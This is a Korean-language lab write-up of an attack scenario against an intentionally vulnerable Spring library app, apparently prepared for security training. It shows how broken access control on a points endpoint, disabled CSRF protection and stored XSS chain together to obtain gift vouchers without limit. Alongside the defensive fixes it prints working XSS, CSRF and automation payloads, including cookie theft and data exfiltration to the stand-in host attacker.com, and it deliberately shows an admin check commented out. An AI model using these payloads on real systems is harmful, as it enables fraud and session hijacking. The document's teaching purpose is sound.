# 공격 시나리오 1: 권한 상승을 통한 문화상품권 부정 취득

> **목적**: 일반 사용자가 관리자 권한 없이 자신의 포인트를 조작하여 문화상품권을 부정 취득하는 공격

---

## 🎯 공격 개요

- **공격자 프로필**: 일반 사용자 (USER 권한)
- **공격 목표**: 문화상품권 무한 취득
- **사용되는 취약점**:
  1. **Broken Access Control** (CWE-284)
  2. **CSRF** (CWE-352)
  3. **XSS** (CWE-79) - 선택적
  4. **Session Fixation** (CWE-384) - 선택적

---

## 📋 공격 단계

### 1단계: 정보 수집 (Reconnaissance)

**목표**: 공격에 필요한 정보 수집

```bash
# 현재 사용자 정보 조회
GET /api/auth/me
```

**획득 정보**:
- User ID
- 현재 포인트
- 사용자 권한 (USER)
- 이메일

**예상 응답**:
```json
{
  "authenticated": true,
  "userId": 3,
  "username": "attacker",
  "points": 120,
  "role": "USER",
  "email": "attacker@example.com"
}
```

---

### 2단계: 취약점 발견 (Vulnerability Discovery)

**관리자 API 탐색**:
일반적으로 관리자 기능은 `/admin/` 경로에 있을 것으로 예상

**발견된 취약한 엔드포인트**:
```
POST /admin/api/users/{userId}/points
```

**취약점 분석**:
- [AdminController.java:168-210](SESAC_Library/src/main/java/com/example/sesac_library/controller/AdminController.java#L168-L210)
- 관리자 권한 체크 코드가 주석 처리됨 (176-179줄)
- 로그인만 확인 (일반 사용자도 접근 가능)
- 포인트 값 검증 없음 (음수, 과도한 값 모두 허용)

**취약한 코드**:
```java
@PostMapping("/api/users/{userId}/points")
public ResponseEntity<Map<String, Object>> updateUserPoints(
        @PathVariable Long userId,
        @RequestBody Map<String, Integer> request,
        HttpSession session) {

    // 취약점 1: 관리자 권한 체크를 주석 처리 (의도적)
    // if (!isAdmin(session)) {
    //     return ResponseEntity.status(403).body(Map.of("error", "권한이 없습니다."));
    // }

    // 취약점 2: 로그인만 확인 (일반 사용자도 접근 가능)
    String username = (String) session.getAttribute("username");
    if (username == null) {
        return ResponseEntity.status(401).body(Map.of("error", "로그인이 필요합니다."));
    }

    // ... 포인트 업데이트 로직
    targetUser.setPoints(newPoints);  // 취약점 3: 검증 없음
}
```

---

### 3단계: 권한 상승 공격 (Privilege Escalation)

**공격 실행**:
```bash
POST /admin/api/users/3/points
Content-Type: application/json

{
  "points": 999999
}
```

**결과**:
- 일반 사용자가 자신의 포인트를 999,999로 증가
- 관리자 권한 없이 성공

**응답 예시**:
```json
{
  "success": true,
  "message": "포인트가 업데이트되었습니다.",
  "userId": 3,
  "newPoints": 999999
}
```

---

### 4단계: CSRF 공격으로 문화상품권 교환

**CSRF 취약점**:
- [InsecureSecurityConfig.java](SESAC_Library/src/main/java/com/example/sesac_library/config/InsecureSecurityConfig.java)
- `csrf.disable()` - CSRF 보호 완전 비활성화
- `prod` 프로필에도 이 설정 적용됨

**공격 실행**:
```bash
POST /api/auth/exchange-voucher
Cookie: JSESSIONID=<victim-session>
```

**자동화된 공격**:
```html
<!-- 악성 페이지에 삽입 -->
<script>
fetch('/api/auth/exchange-voucher', {
  method: 'POST',
  credentials: 'include'
}).then(r => r.json()).then(data => {
  console.log('문화상품권 교환 완료:', data);
});
</script>
```

**결과**:
- 5,000 포인트 차감
- 문화상품권 교환 성공
- 이메일로 발송 (현재는 메시지만 표시)

---

### 5단계: 반복 실행 (Exploitation at Scale)

**공격 반복**:
1. 포인트 조작: 999,999로 증가
2. 문화상품권 교환 (5,000 포인트 차감)
3. 남은 포인트: 994,999
4. 다시 1단계로 → 무한 반복 가능

**자동화 스크립트**:
```javascript
async function autoExploit() {
  while (true) {
    // 포인트 증가
    await fetch('/admin/api/users/3/points', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({points: 999999}),
      credentials: 'include'
    });

    // 문화상품권 교환
    await fetch('/api/auth/exchange-voucher', {
      method: 'POST',
      credentials: 'include'
    });

    await sleep(1000);
  }
}
```

---

## 🎭 고급 공격: XSS를 통한 자동화

### XSS 취약점

**위치**: [boardView.html:237](SESAC_Library/src/main/resources/static/boardView.html#L237)
```javascript
document.getElementById('postContent').innerHTML = board.content.replace(/\n/g, '<br>');
```

**문제점**:
- `innerHTML` 사용으로 HTML 태그 그대로 렌더링
- 사용자 입력 이스케이프 없음
- XSS 공격 가능

---

### XSS 공격 페이로드

**1. 기본 XSS 테스트**:
```html
<script>alert('XSS 공격 성공!');</script>
```

**2. 자동 포인트 조작**:
```html
<script>
fetch('/admin/api/users/1/points', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({points: 999999}),
  credentials: 'include'
}).then(r => r.json()).then(d => {
  console.log('포인트 조작 성공:', d);
});
</script>
```

**3. 자동 문화상품권 교환**:
```html
<script>
// 관리자가 게시글을 보면 자동으로 실행
fetch('/api/auth/exchange-voucher', {
  method: 'POST',
  credentials: 'include'
}).then(r => r.json()).then(d => {
  console.log('교환 완료:', d);
  // 공격자 서버로 결과 전송
  fetch('http://attacker.com/log?data=' + JSON.stringify(d));
});
</script>
```

**4. 쿠키 탈취 (Session Hijacking)**:
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**5. 이미지 태그를 이용한 스텔스 공격**:
```html
<img src="x" onerror="
  fetch('/admin/api/users/3/points', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({points: 999999}),
    credentials: 'include'
  });
">
```

---

## 🔗 공격 체인 전체 흐름

```
[일반 사용자 로그인]
        ↓
[API 탐색 및 취약점 발견]
        ↓
[POST /admin/api/users/{userId}/points] ← Broken Access Control
        ↓
[포인트 999,999로 증가]
        ↓
[POST /api/auth/exchange-voucher] ← CSRF
        ↓
[문화상품권 취득]
        ↓
[반복 실행] → 무한 문화상품권 획득

--- 선택적 고급 공격 ---
        ↓
[게시판에 XSS 페이로드 작성] ← XSS
        ↓
[관리자가 게시글 조회]
        ↓
[자동으로 관리자 세션으로 포인트 조작 + 교환]
```

---

## 💻 실습 방법

### 방법 1: 공격 데모 페이지 사용

1. 브라우저에서 접속:
   ```
   http://localhost:8080/attack-demo.html
   ```

2. 일반 사용자로 로그인

3. "전체 공격 실행" 버튼 클릭

4. 자동으로 모든 공격 단계 실행

---

### 방법 2: 수동 실행 (curl)

```bash
# 1. 로그인
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password123"}' \
  -c cookies.txt

# 2. 내 정보 확인
curl -X GET http://localhost:8080/api/auth/me \
  -b cookies.txt

# 3. 포인트 조작
curl -X POST http://localhost:8080/admin/api/users/3/points \
  -H "Content-Type: application/json" \
  -d '{"points":999999}' \
  -b cookies.txt

# 4. 문화상품권 교환
curl -X POST http://localhost:8080/api/auth/exchange-voucher \
  -b cookies.txt
```

---

### 방법 3: XSS 공격 실습

1. 일반 사용자로 로그인

2. 게시판 → 글쓰기

3. 내용에 다음 페이로드 입력:
   ```html
   <script>alert('XSS 성공!');</script>
   ```

4. 게시글 저장

5. 게시글 조회 시 alert 창 표시 확인

6. 고급 페이로드로 자동 공격 실행:
   ```html
   <img src=x onerror="fetch('/admin/api/users/3/points',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({points:999999}),credentials:'include'})">
   ```

---

## 🛡️ 방어 방법

### 1. Broken Access Control 수정

**AdminController.java**:
```java
@PostMapping("/api/users/{userId}/points")
public ResponseEntity<Map<String, Object>> updateUserPoints(
        @PathVariable Long userId,
        @RequestBody Map<String, Integer> request,
        HttpSession session) {

    // ✅ 관리자 권한 체크 활성화
    if (!isAdmin(session)) {
        return ResponseEntity.status(403).body(Map.of("error", "권한이 없습니다."));
    }

    // ✅ 포인트 값 검증 추가
    Integer newPoints = request.get("points");
    if (newPoints == null || newPoints < 0 || newPoints > 1000000) {
        return ResponseEntity.badRequest().body(Map.of("error", "유효하지 않은 포인트 값입니다."));
    }

    // ... 나머지 로직
}
```

---

### 2. CSRF 보호 활성화

**application.yml**:
```yaml
spring:
  profiles:
    active: secure  # prod에도 secure 프로필 사용
```

**또는 InsecureSecurityConfig.java 삭제**

---

### 3. XSS 방어

**Option 1: textContent 사용**:
```javascript
// boardView.html
document.getElementById('postContent').textContent = board.content;
```

**Option 2: DOMPurify 라이브러리 사용**:
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
<script>
  const clean = DOMPurify.sanitize(board.content);
  document.getElementById('postContent').innerHTML = clean;
</script>
```

**Option 3: 백엔드에서 이스케이프**:
```java
import org.springframework.web.util.HtmlUtils;

board.setContent(HtmlUtils.htmlEscape(content));
```

---

### 4. 세션 관리 강화

**AuthController.java**:
```java
@PostMapping("/login")
public ResponseEntity<Map<String, String>> login(@RequestBody LoginRequest request, HttpSession session) {
    if (userService.authenticateUser(request.getUsername(), request.getPassword())) {
        // ✅ 세션 고정 공격 방어: 기존 세션 무효화 후 새 세션 생성
        session.invalidate();
        session = request.getSession(true);

        session.setAttribute("username", request.getUsername());
        // ...
    }
}
```

---

### 5. 트랜잭션 관리

**AuthController.java**:
```java
@PostMapping("/exchange-voucher")
@Transactional  // ✅ 트랜잭션 추가
public ResponseEntity<Map<String, Object>> exchangeVoucher(HttpSession session) {
    // ... 기존 코드
}
```

---

### 6. 감사 로그 추가

```java
@Slf4j
@PostMapping("/api/users/{userId}/points")
public ResponseEntity<Map<String, Object>> updateUserPoints(...) {
    log.warn("포인트 조작 시도 - 요청자: {}, 대상: {}, 새 포인트: {}",
             username, userId, newPoints);
    // ...
}
```

---

## 📊 취약점 요약

| 취약점 | CWE | CVSS | 심각도 | 위치 |
|--------|-----|------|--------|------|
| Broken Access Control | CWE-284 | 9.1 | Critical | AdminController:168 |
| CSRF | CWE-352 | 8.1 | High | InsecureSecurityConfig |
| XSS | CWE-79 | 7.2 | High | boardView.html:237 |
| Session Fixation | CWE-384 | 6.5 | Medium | AuthController:44 |
| Missing Transaction | CWE-662 | 5.3 | Medium | AuthController:97 |

---

## 🎓 학습 포인트

1. **접근 제어의 중요성**: 모든 API에서 권한 체크 필수
2. **CSRF 보호**: 상태 변경 요청에는 CSRF 토큰 필수
3. **XSS 방어**: 사용자 입력은 항상 이스케이프
4. **세션 관리**: 로그인 시 세션 재생성
5. **방어적 프로그래밍**: 입력값 검증, 트랜잭션 관리 등

---

## 📝 발표 시 강조할 포인트

1. **실제 피해 사례**: 포인트 조작 → 금전적 손실
2. **공격의 용이성**: 특별한 도구 없이 브라우저만으로 공격 가능
3. **연쇄 공격**: 하나의 취약점이 다른 취약점과 결합되면 더 치명적
4. **보안은 선택이 아닌 필수**: 개발 단계부터 보안 고려 필요
